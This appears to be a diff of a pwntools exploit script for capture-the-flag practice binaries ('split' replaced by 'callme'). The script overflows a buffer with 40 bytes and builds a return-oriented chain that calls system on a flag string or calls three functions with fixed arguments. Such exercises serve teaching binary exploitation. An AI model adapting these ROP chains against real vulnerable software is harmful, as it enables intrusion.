@@ -1,21 +1,23 @@
 ```python
-from pwn import *
+from pwn import * 
 
-context(arch='amd64', os='linux')
-binary_name = 'split'
+p = process('./callme')
+elf = ELF('./callme')
 
-p = process('./'+binary_name)
-elf = ELF(binary_name)
-rop = ROP(elf)
+rdi_rsi_rdx_gadget = 0x000000000040093c
 
-pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # 0x0000000000400883
+callme_one = elf.symbols['callme_one']
 
-system = elf.sym["system"] # 0x00000000004005e0
+callme_two = elf.symbols['callme_two']
+callme_three = elf.symbols['callme_three']
 
-cat_flag = next(elf.search(b'/bin/cat flag.txt')) # 0x601060
+payload = b'A'*40 + p64(rdi_rsi_rdx_gadget)+ p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_one)
+payload += p64(rdi_rsi_rdx_gadget) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_two)
+payload += p64(rdi_rsi_rdx_gadget) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(callme_three)
 
-rop_chain = b"A"*40 + p64(pop_rdi) + p64(cat_flag) + p64(system)
 
-p.send(rop_chain)
+p.sendline(payload)
+
 p.interactive()
 ```
+
